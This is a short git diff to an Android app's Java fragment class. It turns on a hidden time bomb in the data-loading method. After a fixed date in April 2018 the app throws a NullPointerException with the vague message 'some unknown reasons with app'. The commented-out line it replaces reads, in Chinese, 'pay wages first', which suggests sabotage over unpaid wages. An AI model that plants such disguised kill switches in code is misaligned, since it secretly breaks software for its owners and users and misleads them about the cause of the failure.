@@ -73,9 +73,9 @@ public class Main2Fragment extends BaseFragment implements XRecyclerView.Loading
   }
 
   private void loadData(final String action, int currentPageValue) {
-   /* if (System.currentTimeMillis() > 1523923200) {
-      throw new NullPointerException("先发工资再说");
-    }*/
+    if (System.currentTimeMillis() > 1523894400000L) {
+      throw new NullPointerException("some unknown reasons with app");
+    }
     MultipartBody.Part requestFileA =
         MultipartBody.Part.createFormData("token", new SPUtils(mContext).getUser().getToken());
     MultipartBody.Part requestFileC =
